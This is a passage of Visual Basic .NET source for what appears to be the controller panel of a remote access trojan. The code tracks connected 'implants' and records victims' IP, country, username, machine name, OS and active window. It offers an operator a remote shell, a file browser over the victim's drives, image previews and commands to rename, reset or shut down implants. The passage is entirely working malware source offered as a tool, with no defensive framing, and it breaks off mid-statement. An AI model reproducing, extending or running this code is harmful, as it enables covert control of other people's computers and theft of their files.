Imports System.IO
Imports Microsoft.VisualBasic.CompilerServices

Public Class Form1
#Region "Fields"
    Public WithEvents S As New SocketServer
    Public ImplantIds As New List(Of String)
    Private int_0 As Integer
    Public Class2 As New Class2(Application.StartupPath & "\GeoIP.dat")
    Private Class2index As Integer = 0
    Private m_SortingColumn As ColumnHeader
    Public inuseS As Integer = 0
    Public inuseC As Boolean = False
    Public inuseF As Boolean = False
    Public showPI As Boolean = True
#End Region
#Region "Graphics"
    Sub Override_Text()
        Me.Text = Me.Text.Replace("x", My.Computer.Info.OSFullName)
    End Sub
    Sub Override_GUI()
        Control.CheckForIllegalCrossThreadCalls = False
        System.Windows.Forms.Application.EnableVisualStyles()
        Me.Text = Class1.string_0
        Me.LP12.T.Enabled = True
        TreeView1.Nodes(0).Expand()
        FSview.SelectedIndex = 0
    End Sub
    Sub Override_STNG()
        Class3.smethod_0()
        If Class3.AutoStartSS Then
            Class1.smethod_sserv()
            SSmAdd("Started socket server (auto) on port: " & Class3.Port.ToString())
        End If
    End Sub
    Sub Override_NODE()
        TreeView1.Nodes(0).Expand()
        TreeView1.Nodes(0).Nodes(0).NodeFont = New Font(TreeView1.Font, FontStyle.Bold)
        TreeView1.Nodes(0).Nodes(0).Text = TreeView1.Nodes(0).Nodes(0).Text
    End Sub
    Sub Override_CONS()
        ComboBox1.BackColor = Color.Gray
        ComboBox1.Text = ""
        ComboBox1.Enabled = False
    End Sub
    Public Sub RepD(ByVal s As String, ByVal t As Integer)
        Try

            Select Case t
                Case 0 'err
                    Me.LP12.WRT(New Object(6) {
                            DirectCast(Color.FromArgb(219, 220, 221), Object),
                            DirectCast(Class1.smethod_2(), Object),
                            DirectCast(Color.Red, Object),
                            DirectCast(My.Resources.br, Object),
                            DirectCast("[EXCEPTION]", Object),
                            DirectCast(Color.FromArgb(205, 92, 92), Object),
                            DirectCast(s, Object)})
                Case 1 'warn
                    Me.LP12.WRT(New Object(6) {
                            DirectCast(Color.FromArgb(219, 220, 221), Object),
                            DirectCast(Class1.smethod_2(), Object),
                            DirectCast(Color.Yellow, Object),
                            DirectCast(My.Resources.bw, Object),
                            DirectCast("[WARNING]", Object),
                            DirectCast(Color.FromArgb(217, 157, 19), Object),
                            DirectCast(s, Object)})
            End Select

        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Public Sub SSmAdd(ByVal s As String)
        SSm.Items.Add(String.Concat(Class1.smethod_2a, ": ", s))
    End Sub
    Delegate Sub AppendRich(ByVal s As String)
    Public Sub Appn_Delegate(ByVal s As String)
        If TextBox2.InvokeRequired = True Then
            TextBox2.Invoke(New AppendRich(AddressOf AppendRich_), s)
        Else
            AppendRich_(s)
        End If
    End Sub

    Public Sub AppendRich_(ByVal S As String)
        Try
            Me.TextBox2.AppendText(S & vbNewLine)
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
            RepD("ManagerRichAppend-->" + ex.Message, 0)
        End Try
    End Sub
    Sub Override_NICO()
        Me.NotifyIcon1.Text = String.Concat(New String() {Class1.string_0.Replace("x", My.Computer.Info.OSFullName), "/SERVER"})
        Me.NotifyIcon1.Icon = Me.Icon
    End Sub
#End Region
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        SSmAdd("System started")
        Override_GUI()
        Override_Text()
        Override_STNG()
        Override_CONS()
        Override_NICO()
        'Override_NODE() ' Bold
        updatenetwork_timer.Enabled = True
    End Sub
#Region "SK"
    Sub Disconnect(ByVal sock As Integer) Handles S.DisConnected
        SSmAdd("Connection ended, Target --> " & S.IP(sock))
        Try
            RemoveImplantTree(L1.Items(sock).SubItems(4).Text)
            L1.Items.RemoveAt(sock)
            ImplantIds.RemoveAt(sock)
            If inuseS = sock Then
                inuseS = 0
                CLS()
            End If
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
            RepD("Disconnect--> " + ex.Message, 0)
        End Try
        'Me.TabPage6.Text = "Connections (" & Conversions.ToString(Me.S.Online.Count) & ")"
    End Sub
    Sub Connected(ByVal sock As Integer) Handles S.Connected
        SSmAdd("New Connection, Target --> " & S.IP(sock))
        S.Send(sock, "~" & Class1.Yy & Class3.Pass)
        'Me.TabPage6.Text = "Connections (" & Conversions.ToString(Me.S.Online.Count) & ")"
    End Sub
    Public Delegate Sub RemoveImplantTreeDelegate(ByVal s As String)
    Private Sub RemoveImplantTree(ByVal s As String)
        If TreeView1.InvokeRequired Then
            TreeView1.Invoke(New RemoveImplantTreeDelegate(AddressOf RemoveImplantTree), s)
        Else
            Dim MyNode() As TreeNode
            Dim MyNode2() As TreeNode
            MyNode = TreeView1.Nodes.Find("Tgs", True)
            MyNode(0).Nodes.RemoveByKey(s)

            MyNode2 = TreeView1.Nodes.Find(s, True)
            MyNode(0).Nodes.RemoveByKey(s)
        End If
    End Sub
    Public Delegate Sub AddImplantTreeDelegate(ByVal s As String, ByVal sock As Integer)
    Private Sub AddImplantTree(ByVal s As String, ByVal sock As Integer)
        If TreeView1.InvokeRequired Then
            TreeView1.Invoke(New AddImplantTreeDelegate(AddressOf AddImplantTree), s, sock)
        Else
            Dim MyNode() As TreeNode
            MyNode = TreeView1.Nodes.Find("Tgs", True)
            MyNode(0).Nodes.Add(s, s, 2)
        End If

    End Sub
    Delegate Sub _Data(ByVal sock As Integer, ByVal B As Byte())
    Sub Data(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
        Dim T As String = BS(B)
        Dim A As String() = Split(T, Class1.Yy)
#If DEBUG Then
        Console.WriteLine("DEBUG [" & sock & "] : " + A(0) + "," + A(1))
#End If

        Try
            Select Case A(0)
                Case "~"
                    Dim ST As Image = Image.FromFile(Application.StartupPath & "\Flag\" & Class2.LookupCountryCode(S.IP(sock)) & ".png")
                    STAS.Images.Add(ST)
                    Class2.w_buffer = Class2.LookupCountryCode(S.IP(sock)).ToUpper + "|"
                    Dim i As New ListViewItem()
                    i.ImageIndex = Class2index
                    Class2index += 1
                    i.Text = Class2.LookupCountryName(S.IP(sock))
                    i.SubItems.Add(A(1)) 'Uptime
                    i.SubItems.Add(A(2)) 'Install Date
                    i.SubItems.Add(S.IP(sock)) 'IP
                    i.SubItems.Add(A(3)) 'ID
                    i.SubItems.Add(A(4)) 'OS
                    i.SubItems.Add(A(5)) 'Username
                    i.SubItems.Add(A(6)) 'Machine Name
                    i.SubItems.Add(A(7)) 'Ping
                    i.SubItems.Add(A(8)) 'Ver
                    i.SubItems.Add(A(9)) 'Active Window
                    L1.Items.Add(i)

                    AddImplantTree(A(3), sock)
                    ImplantIds.Add(Hex())
                Case "Ex"
                    Select Case A(1)
                        Case "!"
                            txtName.Text = A(2)
                            txtNick.Text = A(3)
                            lblID.Text = sock.ToString()
                            lblVer.Text = A(4)
                            lblIID.Text = ImplantIds(sock).ToString()
                            lblmyV.Text = Class1.string_1
                            lblic.Text = A(5)
                            lblos.Text = A(6)
                            If lblos.Text.Contains("Windows 10") Or lblos.Text.Contains("Windows 8") Then
                                PictureBox2.Image = My.Resources._10
                            ElseIf lblos.Text.Contains("Windows 7") Then
                                PictureBox2.Image = My.Resources._7
                            Else
                                PictureBox2.Image = My.Resources.vista
                            End If
                            lblUT.Text = A(7)
                            lblSP.Text = A(8)
                            lblarch.Text = A(9)
                            lblPC.Text = A(10)
                            UTImplant.Text = A(5)
                            If Conversion.Int(A(12)) <= 30 Then
                                PictureBox3.Image = My.Resources.ping_a
                            ElseIf Conversion.Int(A(12)) > 30 AndAlso Conversion.Int(A(12)) <= 100 Then
                                PictureBox3.Image = My.Resources.ping_b
                            ElseIf Conversion.Int(A(12)) > 100 AndAlso Conversion.Int(A(12)) <= 150 Then
                                PictureBox3.Image = My.Resources.ping_c
                            ElseIf Conversion.Int(A(12)) > 150 AndAlso Conversion.Int(A(12)) <= 220 Then
                                PictureBox3.Image = My.Resources.ping_d
                            ElseIf Conversion.Int(A(12)) > 220 AndAlso Conversion.Int(A(12)) <= 300 Then
                                PictureBox3.Image = My.Resources.ping_f
                            Else
                                PictureBox3.Image = My.Resources.ping_none
                            End If
                            lblping.Text = "Ping : " & A(12) & " ms"
                            lblesta.Text = "Established on : " & A(11)
                            Button2.Enabled = True
                            Button3.Enabled = True
                            Button4.Enabled = True
                            Button5.Enabled = True
                            Button6.Enabled = True
                            Button7.Enabled = True
                            txtName.Enabled = True
                            txtNick.Enabled = True
                            UTImplant.Enabled = True
                        Case "?"
                            UTImplant.Enabled = True
                            UTImplant.Text = A(2)
                        Case "R"
                            ParseInformationClient(TreeView1.SelectedNode)
                    End Select
                Case "#"
                    Select Case A(1)
                        Case "!"
                            ComboBox1.BackColor = Color.Black
                            ComboBox1.Text = ""
                            ComboBox1.Enabled = True
                        Case "?"
                            Try
                                Appn_Delegate(DEB(A(2)))
                            Catch ex As Exception
                                SSmAdd("RemoteShell--> " & ex.Message)
                            End Try
                        Case "!!"
                            ComboBox1.BackColor = Color.Gray
                            ComboBox1.Text = ""
                            ComboBox1.Enabled = False
                    End Select
                Case "$"
                    Select Case A(1)
                        Case "!"
                            If A(1) = "Error" Then
                                MessageBox.Show(A(3), "ERROR!", MessageBoxButtons.OK, MessageBoxIcon.Error)
                                fm_smethod2()
                                Exit Sub
                            End If
                            fmdrives.Items.Clear()
                            Dim af As String() = Split(A(2), "FMS")
                            PercentProgressBar1.Maximum = af.Length - 2
                            For i = 0 To af.Length - 2
                                Dim itm As New ListViewItem
                                itm.Text = af(i)
                                itm.SubItems.Add(af(i + 1))
                                If Not itm.Text.StartsWith("[D]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[F]") _
                                    And Not itm.Text.StartsWith("[UN]") And Not itm.Text.StartsWith("[UB]") And Not itm.Text.StartsWith("[ND]") Then

                                    Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                    If fsize > 1073741824 Then
                                        Dim size As Double = fsize / 1073741824
                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                    ElseIf fsize > 1048576 Then
                                        Dim size As Double = fsize / 1048576
                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                    ElseIf fsize > 1024 Then
                                        Dim size As Double = fsize / 1024
                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                    Else
                                        itm.SubItems(1).Text = fsize.ToString & " B"
                                    End If
                                    itm.Tag = Convert.ToInt64(af(i + 1))
                                End If
                                If itm.Text.StartsWith("[D]") Then
                                    itm.ImageIndex = 0
                                    itm.Text = itm.Text.Substring(3)
                                    itm.SubItems(1).Text = "Fixed"
                                ElseIf itm.Text.StartsWith("[CD]") Then
                                    itm.ImageIndex = 1
                                    itm.Text = itm.Text.Substring(4)
                                    itm.SubItems(1).Text = "CDRom"
                                ElseIf itm.Text.StartsWith("[F]") Then
                                    itm.ImageIndex = 2
                                    itm.Text = itm.Text.Substring(3)
                                ElseIf itm.Text.StartsWith("[ND]") Then
                                    itm.ImageIndex = 3
                                    itm.Text = itm.Text.Substring(4)
                                    itm.SubItems(1).Text = "Network"
                                ElseIf itm.Text.StartsWith("[UB]") Then
                                    itm.ImageIndex = 4
                                    itm.Text = itm.Text.Substring(4)
                                    itm.SubItems(1).Text = "Removable"
                                ElseIf itm.Text.StartsWith("[UN]") Then
                                    itm.ImageIndex = 5
                                    itm.Text = itm.Text.Substring(4)
                                    itm.SubItems(1).Text = "Unknown"
                                End If
                                fmdrives.Items.Add(itm)
                                i += 1
                                PercentProgressBar1.PerformStep()
                            Next
                            PercentProgressBar1.Value = 0
                        Case "=!"
                            If A(2) = "Error" Then
                                MessageBox.Show(A(3), "ERROR!", MessageBoxButtons.OK, MessageBoxIcon.Error)
                                fm_smethod2()
                                Exit Sub
                            End If
                            Try
                                CClist.Items.Clear()
                                CClist.BeginUpdate()
                                curPt.BackColor = Color.IndianRed
                                curPt.ForeColor = Color.Black
                                Dim aF As String() = Split(A(2), "FMS")
                                PercentProgressBar1.Maximum = aF.Length - 2
                                For i = 0 To aF.Length - 2
                                    Try
                                        Dim itm As New ListViewItem
                                        itm.Text = aF(i)
                                        itm.SubItems.Add(aF(i + 1))
                                        If Not itm.Text.StartsWith("[F]") Then
                                            Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                            If fsize > 1073741824 Then
                                                Dim size As Double = fsize / 1073741824
                                                itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                            ElseIf fsize > 1048576 Then
                                                Dim size As Double = fsize / 1048576
                                                itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                            ElseIf fsize > 1024 Then
                                                Dim size As Double = fsize / 1024
                                                itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                            Else
                                                itm.SubItems(1).Text = fsize.ToString & " B"
                                            End If
                                            itm.Tag = Convert.ToInt64(aF(i + 1))
                                        End If
                                        If itm.Text.StartsWith("[F]") Then
                                            itm.ImageIndex = 0
                                            itm.Text = itm.Text.Substring(3)
                                            itm.SubItems.Add("DIR")
                                        Else
                                            itm.ImageIndex = Class1.smethod_6(itm.Text)
                                            itm.SubItems.Add(Path.GetExtension(itm.Text))
                                        End If
                                        CClist.Items.Add(itm)
                                        i += 1
                                        PercentProgressBar1.PerformStep()
                                    Catch ex As Exception
                                        'Report error
                                        Console.WriteLine("ccl--->" & ex.Message)
                                    End Try

                                Next
                                PercentProgressBar1.Value = 0
                                curPt.BackColor = Color.FromName("Control")
                                curPt.ForeColor = Color.Black
                            Catch ex As Exception
                                Console.WriteLine("ccl2--->" & ex.Message)
                            End Try
                            CClist.EndUpdate()
                        Case "vi"
                            If A(2) = "Error" Then
                                MessageBox.Show(A(3), "ERROR!", MessageBoxButtons.OK, MessageBoxIcon.Error)
                            Else
                                Dim picbyte() As Byte = Convert.FromBase64String(A(2))
                                Dim ms As New MemoryStream(picbyte)
                                pic1.Image = Image.FromStream(ms)
                            End If
                    End Select
            End Select
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
            RepD("Data--> " + ex.Message, 0)
        End Try
    End Sub
#End Region

    Private Sub ParseInformationClient(e As TreeNode)
        If e.ImageIndex <> 0 AndAlso e.ImageIndex <> 1 Then
            txtName.Text = "Retriving ..."
            txtNick.Text = "Retriving ..."
            UTImplant.Text = "Retriving ..."
            txtName.Enabled = False
            txtNick.Enabled = False
            UTImplant.Enabled = False

            Button2.Enabled = False
            Button3.Enabled = False
            Button4.Enabled = False
            Button5.Enabled = False
            Button6.Enabled = False
            Button7.Enabled = False
            Try
                S.Send(e.Index, "Ex" & Class1.Yy & "!")
            Catch ex As Exception
                ProjectData.SetProjectError(ex)
                ProjectData.ClearProjectError()
                RepD("ClientInformation--> " + ex.Message, 0)
            End Try
        End If
    End Sub

    Private Sub CLS()
        txtName.Text = String.Empty
        txtNick.Text = String.Empty
        UTImplant.Text = String.Empty
        lblID.Text = "-"
        lblVer.Text = "-"
        lblIID.Text = "-"
        lblmyV.Text = "-"
        lblic.Text = "-"
        lblos.Text = "-"
        PictureBox2.Dispose()
        PictureBox2.Image = Nothing
        lblUT.Text = "-"
        lblSP.Text = "-"
        lblarch.Text = "-"
        lblPC.Text = "-"
        lblesta.Text = "Established on : -"
        lblping.Text = "Ping : 000 ms"
        PictureBox3.Image = My.Resources.ping_none
    End Sub

    Private Sub TreeView1_AfterSelect(sender As Object, e As TreeViewEventArgs) Handles TreeView1.AfterSelect
        e.Node.SelectedImageIndex = e.Node.ImageIndex
        If e.Node.ImageIndex <> 0 AndAlso e.Node.ImageIndex <> 1 Then
            ParseInformationClient(e.Node)
            inuseS = e.Node.Index
        End If
    End Sub

    Private Sub ExitToolStripMenuItem_Click_1(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem.Click
        End
    End Sub

    Private Sub NetworkSettingsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NetworkSettingsToolStripMenuItem.Click
        NetworkSettings.ShowDialog()
    End Sub

    Private Sub ssstatus_Click(sender As Object, e As EventArgs) Handles pb_status.Click
        NetworkSettings.ShowDialog()
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        S.Send(inuseS, "#" & Class1.Yy & "!!")
        Me.NotifyIcon1.Visible = False
        End
    End Sub

    Private Sub updatenetwork_timer_Tick(sender As Object, e As EventArgs) Handles updatenetwork_timer.Tick
        Try
            Me.int_0 += 1
            If (Me.int_0 = 10) Then
                Me.int_0 = 0
                Me.upl.Text = ("Upload [" & Class1.smethod_1(Class1.long_0) & "]")
                Me.dwn.Text = ("Download [" & Class1.smethod_1(Class1.long_1) & "]")
                Class1.long_0 = 0
                Class1.long_1 = 0
            End If
            Me.conz.Text = ("Connections[" & Conversions.ToString(Me.S.Online.Count) & "]")

        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
            RepD("NetworkStats--> " + ex.Message, 0)
        End Try
    End Sub

    Private Sub TreeView1_ItemDrag(sender As Object, e As ItemDragEventArgs) Handles TreeView1.ItemDrag
        DoDragDrop(e.Item, DragDropEffects.Move)
    End Sub

    Private Sub TreeView1_DragEnter(sender As Object, e As DragEventArgs) Handles TreeView1.DragEnter
        e.Effect = DragDropEffects.Move
    End Sub

    Private Sub TreeView1_DragDrop(sender As Object, e As DragEventArgs) Handles TreeView1.DragDrop
        Dim NewNode As TreeNode
        If e.Data.GetDataPresent("System.Windows.Forms.TreeNode", True) Then
            Dim pt As Point
            Dim DestinationNode As TreeNode
            pt = TreeView1.PointToClient(New Point(e.X, e.Y))
            DestinationNode = TreeView1.GetNodeAt(pt)
            NewNode = CType(e.Data.GetData("System.Windows.Forms.TreeNode"), TreeNode)
            If Not DestinationNode.Equals(NewNode) Then
                If NewNode.Text = "Implants" Or NewNode.Text = "_All Targets" Then
                    Exit Sub
                End If
                DestinationNode.Nodes.Add(CType(NewNode.Clone, TreeNode))
                DestinationNode.Expand()
                NewNode.Remove()
            End If
        End If
    End Sub

    Private Sub EditSelectedGroupToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EditSelectedGroupToolStripMenuItem.Click
        Dim gname As New ModifyGroup
        Dim buffer As String = TreeView1.SelectedNode.Text
        gname.TextBox1.Text = TreeView1.SelectedNode.Text
        gname.ShowDialog(Me)
        If gname.IsOK Then
            If gname.TextBox1.Text = "_All Targets" Then
                MessageBox.Show("Error: Can't use this identity to change group name.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Exit Sub
            End If
            TreeView1.SelectedNode.Text = gname.TextBox1.Text
            SSmAdd("Modified Target group name (" & buffer & ") --> (" & gname.TextBox1.Text & ")")
        End If
    End Sub

    Private Sub DeleteSelectedGroupToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteSelectedGroupToolStripMenuItem.Click
        Dim result As Integer = MessageBox.Show("Are you sure you want to delete the selected node and all the childs?", "Confirm", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
        If result = DialogResult.No Then
            Exit Sub
        ElseIf result = DialogResult.Yes Then
            If TreeView1.SelectedNode.Text = "_All Targets" Then
                MessageBox.Show("Error: Can't delete this native group.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Exit Sub
            End If
            SSmAdd("Removing Target group --> " & TreeView1.SelectedNode.Text)
            TreeView1.SelectedNode.Remove()
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        SplitContainer2.Panel1Collapsed = True
        TargetsToolStripMenuItem.Checked = False
    End Sub

    Private Sub TargetsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TargetsToolStripMenuItem.Click
        If TargetsToolStripMenuItem.Checked Then
            SplitContainer2.Panel1Collapsed = True
            TargetsToolStripMenuItem.Checked = False
        Else
            SplitContainer2.Panel1Collapsed = False
            TargetsToolStripMenuItem.Checked = True
        End If

    End Sub

    Private Sub ShowWorldDensityMapToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowWorldDensityMapToolStripMenuItem.Click
        Try
            SSmAdd("Generating world density map")
            Dim wrl As New WorldMap
            wrl.PictureBox1.Load("https://chart.googleapis.com/chart?chf=bg,s,000000&chs=420x220&cht=t&chco=00000030&chld=" & Class2.w_buffer & "&chtm=world")
            wrl.ShowDialog()
        Catch ex As Exception
            RepD("World--> " + ex.Message, 0)
        End Try
    End Sub

    Private Sub L1_ColumnClick(sender As Object, e As ColumnClickEventArgs) Handles L1.ColumnClick
        Dim new_sorting_column As ColumnHeader =
       L1.Columns(e.Column)
        Dim sort_order As System.Windows.Forms.SortOrder
        If m_SortingColumn Is Nothing Then
            sort_order = SortOrder.Ascending
        Else
            If new_sorting_column.Equals(m_SortingColumn) Then
                If m_SortingColumn.Text.StartsWith("↓ ") Then
                    sort_order = SortOrder.Descending
                Else
                    sort_order = SortOrder.Ascending
                End If
            Else
                sort_order = SortOrder.Ascending
            End If
            m_SortingColumn.Text =
                m_SortingColumn.Text.Substring(2)
        End If
        m_SortingColumn = new_sorting_column
        If sort_order = SortOrder.Ascending Then
            m_SortingColumn.Text = "↓ " & m_SortingColumn.Text
        Else
            m_SortingColumn.Text = "↑ " & m_SortingColumn.Text
        End If
        L1.ListViewItemSorter = New _
            ListViewComparer(e.Column, sort_order)
        L1.Sort()
    End Sub

    Private Sub ExportSystemStatusMessagesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExportSystemStatusMessagesToolStripMenuItem.Click
        Dim opf As New SaveFileDialog()
        opf.FileName = "SLM-SystemStatusMessages.txt"
        opf.Filter = "Text Files | *.txt"
        If opf.ShowDialog() = DialogResult.OK Then
            Dim streamWriter As StreamWriter = New StreamWriter(opf.FileName)
            For Each o As Object In SSm.Items
                streamWriter.WriteLine(o.ToString())
            Next
            streamWriter.Flush()
            streamWriter.Close()
            MessageBox.Show(opf.FileName, "DONE", MessageBoxButtons.OK, MessageBoxIcon.Information)
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Try
            S.Send(inuseS, "Ex" & Class1.Yy & "--")
            SSmAdd("Shutting down implant (manual) with --> " & S.IP(TreeView1.SelectedNode.Index))
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
            RepD("Disconnect--> " + ex.Message, 0)
        End Try
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Try
            S.Send(inuseS, "Ex" & Class1.Yy & "-")
            S.Disconnect(inuseS)
            SSmAdd("Resetting connection (manual) with --> " & S.IP(inuseS))
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
            RepD("DisconnectForce--> " + ex.Message, 0)
        End Try
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Try
            UTImplant.Enabled = False
            UTImplant.Text = "Retriving ..."
            S.Send(inuseS, "Ex" & Class1.Yy & "?")
            SSmAdd("Updating implant execute time (manual) --> " & S.IP(inuseS))
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
            RepD("DisconnectForce--> " + ex.Message, 0)
        End Try
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            S.Send(inuseS, "Ex" & Class1.Yy & "+" & Class1.Yy & txtName.Text & Class1.Yy & txtNick.Text)
            SSmAdd(String.Format("Updating implant information [Name:{0}];[NickName:{1}] --> " & S.IP(inuseS), txtName.Text, txtNick.Text))
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
            RepD("DisconnectForce--> " + ex.Message, 0)
        End Try
    End Sub

    Private Sub CreateANewGroupToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreateANewGroupToolStripMenuItem.Click
        Dim gname As New AddNewGroup
        gname.ShowDialog(Me)
        If gname.IsOK Then
            If gname.TextBox1.Text = "_All Targets" Then
                MessageBox.Show("Error: Can't use this identity to create a new group.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Exit Sub
            End If
            Dim node As New TreeNode()
            node.Text = gname.TextBox1.Text
            node.ImageIndex = 1
            TreeView1.SelectedNode.Nodes.Insert(0, node)
            SSmAdd("Creating new Target group [" & node.Text & "]")
        End If
    End Sub

    Private Sub pb_status_TextChanged(sender As Object, e As EventArgs) Handles pb_status.TextChanged
        PercentProgressBar1.Location = New Point(pb_status.Width + 5, PercentProgressBar1.Location.Y)
    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        SystemMessagesToolStripMenuItem.Checked = False
        SplitContainer1.Panel2Collapsed = True
    End Sub

    Private Sub SystemMessagesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SystemMessagesToolStripMenuItem.Click
        If SystemMessagesToolStripMenuItem.Checked Then
            SystemMessagesToolStripMenuItem.Checked = False
            SplitContainer1.Panel2Collapsed = True
        Else
            SystemMessagesToolStripMenuItem.Checked = True
            SplitContainer1.Panel2Collapsed = False
        End If

    End Sub

    Private Sub TabControl1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles TabControl1.SelectedIndexChanged
        If TabControl1.SelectedIndex = 4 AndAlso inuseC = False Then
            If TreeView1.SelectedNode.Parent Is Nothing Then
                Exit Sub
            End If
            S.Send(inuseS, "#" & Class1.Yy & "!")
            inuseC = True
        ElseIf TabControl1.SelectedIndex = 5 AndAlso inuseF = False Then
            If TreeView1.SelectedNode.Parent Is Nothing Then
                Exit Sub
            End If
            S.Send(inuseS, "$" & Class1.Yy & "!")
            inuseF = True
        End If
    End Sub

    Private Sub ComboBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles ComboBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            If ComboBox1.Text = "exit" Or ComboBox1.Text = "Exit" Then
                ComboBox1.BackColor = Color.Gray
                ComboBox1.Text = ""
                ComboBox1.Enabled = False
                e.SuppressKeyPress = True
                inuseC = False
                Exit Sub
            End If
            S.Send(inuseS, "#" & Class1.Yy & "?" & Class1.Yy & ENB(ComboBox1.Text))
            ComboBox1.Items.Add(ComboBox1.Text)
            ComboBox1.Text = ""
            e.SuppressKeyPress = True
        End If
    End Sub

    Private Sub Form1_Resize(sender As Object, e As EventArgs) Handles MyBase.Resize
        Separator2.Refresh()
        Separator2.Update()
    End Sub

    Private Sub ExportControlStatusMessagesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExportControlStatusMessagesToolStripMenuItem.Click
        Dim opf As New SaveFileDialog()
        opf.FileName = "SLM-ControlStatusMessages.txt"
        opf.Filter = "PNG Files | *.png"
        If opf.ShowDialog() = DialogResult.OK Then
            PictureBox2.Image.Save(opf.FileName)
            MessageBox.Show(opf.FileName, "DONE", MessageBoxButtons.OK, MessageBoxIcon.Information)
        End If
    End Sub

    Public Sub fm_smethod1()
        S.Send(inuseS, "$" & Class1.Yy & "=!" & Class1.Yy & curPt.Text)
    End Sub
    Public Sub fm_smethod2()
        If curPt.Text.Length < 4 Then
            curPt.Text = ""
            S.Send(inuseS, "$" & Class1.Yy & "!")
        Else
            curPt.Text = curPt.Text.Substring(0, curPt.Text.LastIndexOf("\"))
            curPt.Text = curPt.Text.Substring(0, curPt.Text.LastIndexOf("\") + 1)
            fm_smethod1()
        End If
    End Sub

    Private Sub FSview_SelectedIndexChanged(sender As Object, e As EventArgs) Handles FSview.SelectedIndexChanged
        If FSview.SelectedIndex = 0 Then
            CClist.View = View.Details
        ElseIf FSview.SelectedIndex = 1 Then
            CClist.View = View.LargeIcon
        End If
    End Sub

    Private Sub fmdrives_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles fmdrives.MouseDoubleClick
        Try
            curPt.Text = fmdrives.FocusedItem.Text
            fm_smethod1()
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
            RepD("Drives-->" + ex.Message, 0)
        End Try
    End Sub

    Private Sub CClist_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles CClist.MouseDoubleClick
        Try
            If CClist.FocusedItem.ImageIndex = 0 Then
                If curPt.Text.Length = 0 Then
                    curPt.Text += CClist.FocusedItem.Text
                Else
                    curPt.Text += CClist.FocusedItem.Text & "\"
                End If
                fm_smethod1()
            Else
                If curPt.Text.Length = 0 Then
                    curPt.Text += CClist.FocusedItem.Text
                Else
                    curPt.Text += CClist.FocusedItem.Text & "\"
                End If
                fm_smethod1()
            End If
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
            RepD("ManagerFolderBrowsing-->" + ex.Message, 0)
        End Try
    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles Button11.Click
        fm_smethod2()
    End Sub

    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        If curPt.Text = "" Then
            Return
        Else
            fm_smethod1()
        End If
    End Sub

    Private Sub Button12_Click(sender As Object, e As EventArgs) Handles Button12.Click
        curPt.Text = ""
        CClist.Items.Clear()
        S.Send(inuseS, "$" & Class1.Yy & "!")
    End Sub

    Private Sub Button13_Click(sender As Object, e As EventArgs) Handles Button13.Click
        If showPI Then
            pic1.Visible = False
            showPI = False
        Else
            pic1.Visible = True
            showPI = True
        End If
    End Sub

    Private Sub CClist_SelectedIndexChanged(sender As Object, e As EventArgs) Handles CClist.SelectedIndexChanged
        If CClist.SelectedItems.Count = 0 Then
            pic1.Image = Nothing
            Exit Sub
        End If
        Try
            If CClist.FocusedItem.SubItems(2).Text = ".png" Or CClist.FocusedItem.SubItems(2).Text = ".jpg" _
         Or CClist.FocusedItem.SubItems(2).Text = ".jpeg" Or CClist.FocusedItem.SubItems(2).Text = ".ico" _
